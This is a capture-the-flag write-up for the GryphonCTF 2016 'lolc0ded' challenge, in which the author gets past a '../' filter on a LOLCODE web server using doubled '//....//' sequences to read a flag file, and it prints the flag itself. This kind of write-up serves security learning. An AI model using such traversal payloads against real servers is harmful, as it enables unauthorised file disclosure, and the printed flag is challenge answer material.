# GryphonCTF_2016: lolc0ded

**Category:** Pwn
**Points:** 35
**Description:**

    $ curl http://play.spgame.site:13337/README.lol
    HAI 1.337
        CAN HAS STDIO?
        I HAS A file ITZ I IZ STDIO'Z OPEN YR "README.lol" AN YR "r" MKAY
        VISIBLE I IZ STDIO'Z LUK YR file AN YR 13337 MKAY

        OBTW 
           Flag is at /home/lolc0ded/flag.lol.
        TLDR
    KTHXBYE

>The service is running at http://play.spgame.site:13337/.
Feel free to check out http://play.spgame.site:13337/index.lol to learn more about lolc0ded.

## Write-up
Possibly one of the most nugget brained challenge for this year, a HTTP server that runs on garbled crap. In a nutshell, we need to do directory tranversals. Since we have a very verbose 404 page, we just keep trying `http://play.spgame.site:13337/home/../home/lolc0ded/flag.lol`. Apparently, this filters out to become `http://play.spgame.site:13337/home/lolc0ded/flag.lol`. No matter how many `../` you put, it just seems to redirect back.

So let's try `//`. With `http://play.spgame.site:13337/home//../home/lolc0ded/flag.lol`, you get redirected to, `http://play.spgame.site:13337/home/home/lolc0ded/flag.lol`. Interesting pattern now. Is doubling the symbol working? Let's try `//` and `....` now! With `http://play.spgame.site:13337/home//....//home/lolc0ded/flag.lol` You get back the original file at `http://play.spgame.site:13337/home/lolc0ded/flag.lol` except this time around, the url didn't redirect!

Now let's try iterating it upwards. With `http://play.spgame.site:13337/home//....//home/lolc0ded/flag.lol` we have the fake flag file. With `http://play.spgame.site:13337/home//....//....//home/lolc0ded/flag.lol` we have a brutal 404 page with

>Not Found
The requested URL /home//../../home/lolc0ded/flag.lol was not found on this server.

Perfect. At no. 4 we get the flag.

Therefore, the flag is `GCTF{d0nT_c0d3_L0nG_COd3_uS1Ng_L0LcOd3}`.
